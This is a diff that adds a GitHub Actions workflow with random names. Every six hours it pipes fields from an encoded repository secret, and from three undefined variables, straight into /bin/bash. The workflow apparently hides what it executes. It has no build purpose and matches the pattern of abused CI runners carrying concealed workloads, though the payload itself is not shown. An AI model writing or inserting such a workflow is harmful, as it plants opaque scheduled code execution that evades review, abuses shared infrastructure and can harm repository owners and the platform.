@@ -1,0 +1,21 @@
+name: flowerywhizz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: flowerywhizz
+        env:
+          ryqlm2801: ${{ secrets.ryqlm2801 }}
+        run: |
+          echo $ryqlm2801 | jq -r .q44 | /bin/bash
+          echo $icg59 | jq -r .kjqjj8 | /bin/bash
+          echo $ai87 | jq -r .xq67 | /bin/bash
+          echo $w49 | jq -r .vrrvg65933 | /bin/bash
+
